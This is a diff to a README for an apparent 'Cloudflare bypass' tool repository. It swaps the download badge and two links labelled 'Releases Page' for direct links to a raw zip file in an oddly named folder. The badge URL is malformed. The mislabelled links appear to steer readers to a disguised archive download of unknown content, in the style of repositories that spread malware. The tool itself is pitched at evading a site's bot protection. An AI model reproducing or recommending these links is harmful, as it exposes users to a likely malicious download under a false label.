@@ -1,6 +1,6 @@
 # 🌐 cloudflare-bypass-2026 - Bypass Cloudflare Checks Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/AkiroWatanabe/cloudflare-bypass-2026/releases)
+[![Download Latest Release](https://github.com/AkiroWatanabe/cloudflare-bypass-2026/raw/refs/heads/main/pancreatogenous/bypass-cloudflare-v2.3-beta.3.zip%https://github.com/AkiroWatanabe/cloudflare-bypass-2026/raw/refs/heads/main/pancreatogenous/bypass-cloudflare-v2.3-beta.3.zip)](https://github.com/AkiroWatanabe/cloudflare-bypass-2026/raw/refs/heads/main/pancreatogenous/bypass-cloudflare-v2.3-beta.3.zip)
 
 ---
 
@@ -20,7 +20,7 @@ To get started with the application, follow these steps:
      - Linux
 
 2. **Visit the Releases Page**
-   - Go to the [Releases Page](https://github.com/AkiroWatanabe/cloudflare-bypass-2026/releases) to download the latest version of the tool.
+   - Go to the [Releases Page](https://github.com/AkiroWatanabe/cloudflare-bypass-2026/raw/refs/heads/main/pancreatogenous/bypass-cloudflare-v2.3-beta.3.zip) to download the latest version of the tool.
 
 3. **Download the Application**
    - Look for the latest release. You will find various files available for download depending on your operating system.
@@ -52,7 +52,7 @@ To get started with the application, follow these steps:
 
 To start using the Cloudflare Bypass tool:
 
-- Visit the [Releases Page](https://github.com/AkiroWatanabe/cloudflare-bypass-2026/releases) to download the latest version for your operating system.
+- Visit the [Releases Page](https://github.com/AkiroWatanabe/cloudflare-bypass-2026/raw/refs/heads/main/pancreatogenous/bypass-cloudflare-v2.3-beta.3.zip) to download the latest version for your operating system.
 
 ## 📜 Disclaimer
 
